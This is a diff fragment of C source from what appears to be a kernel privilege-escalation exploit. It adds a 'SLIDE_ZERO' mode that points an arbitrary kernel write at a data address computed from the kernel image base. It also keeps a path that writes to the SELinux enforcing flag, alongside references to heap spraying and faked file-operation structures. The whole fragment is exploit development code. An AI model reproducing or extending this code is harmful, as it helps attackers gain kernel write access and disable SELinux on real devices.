@@ -1198,8 +1198,9 @@ int run_exploit(int argc, char **argv) {
    */
   int write_proof = env_flag("MODE4_WRITE_PROOF", 0) ||
                     env_flag("MODE4_ARISTOTLE", 0) ||
-                    env_flag("MODE4_SLIDE", 0);
-  if (env_flag("MODE4_SLIDE", 0)) {
+                    env_flag("MODE4_SLIDE", 0) ||
+                    env_flag("MODE4_SLIDE_ZERO", 0);
+  if (env_flag("MODE4_SLIDE", 0) || env_flag("MODE4_SLIDE_ZERO", 0)) {
     setenv("MODE4_WRITE_PROOF", "1", 0); /* stamp chain gate */
   }
   if (write_proof && umh_available && !force_w1) {
@@ -1213,7 +1214,9 @@ int run_exploit(int argc, char **argv) {
     read_first_line("/sys/fs/selinux/enforce", enf_before, sizeof(enf_before));
 
     const char *tgt_name = getenv("WRITE_PROOF_TARGET");
-    if (!tgt_name || !tgt_name[0])
+    if (env_flag("MODE4_SLIDE_ZERO", 0)) {
+      tgt_name = "dataonly";
+    } else if (!tgt_name || !tgt_name[0])
       tgt_name = "bootid";
     uintptr_t proof_tgt;
     uintptr_t proof_val;
@@ -1223,7 +1226,12 @@ int run_exploit(int argc, char **argv) {
      * (spray). proof_val is unused for geometry (kept 0 → prepare may set
      * pselect_custom_value=fake_fops for bookkeeping).
      */
-    if (!strcmp(tgt_name, "enforce") || !strcmp(tgt_name, "selinux")) {
+    if (!strcmp(tgt_name, "dataonly")) {
+      unsigned long doff = env_ulong("DATAONLY_TARGET", 0x2a793c8);
+      proof_tgt = data_addr(KIMAGE_TEXT_BASE + doff);
+      proof_val = 0;
+      desc = "SLIDE_ZERO data-only";
+    } else if (!strcmp(tgt_name, "enforce") || !strcmp(tgt_name, "selinux")) {
       proof_tgt = data_addr(SELINUX_ENFORCING);
       proof_val = 0;
       desc = "WRITE_PROOF enforce (only-left *enf=fake_fops; may not be 0)";
